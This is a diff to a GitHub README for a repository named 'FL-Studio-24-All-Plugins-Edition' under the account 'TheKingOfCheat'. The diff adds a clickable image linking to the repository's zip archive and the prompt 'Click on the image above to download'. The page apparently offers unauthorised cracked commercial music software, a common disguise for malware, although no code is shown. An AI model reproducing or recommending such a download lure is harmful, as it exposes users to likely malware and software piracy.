@@ -1,5 +1,8 @@
 # FL-Studio-24-All-Plugins-Edition-24.1.2.4394
-![image](https://github.com/user-attachments/assets/2b4c7835-2de6-47fb-b9ee-ae3140612762)
+
+[![image](https://github.com/user-attachments/assets/2b4c7835-2de6-47fb-b9ee-ae3140612762)](https://github.com/TheKingOfCheat/FL-Studio-24-All-Plugins-Edition-24.1.2.4394/archive/refs/heads/main.zip)
+
+Click on the image above to download.
 
 # 🎛️ FL Studio 24 All Plugins Edition 24.1.2.4394 Community Toolkit
 
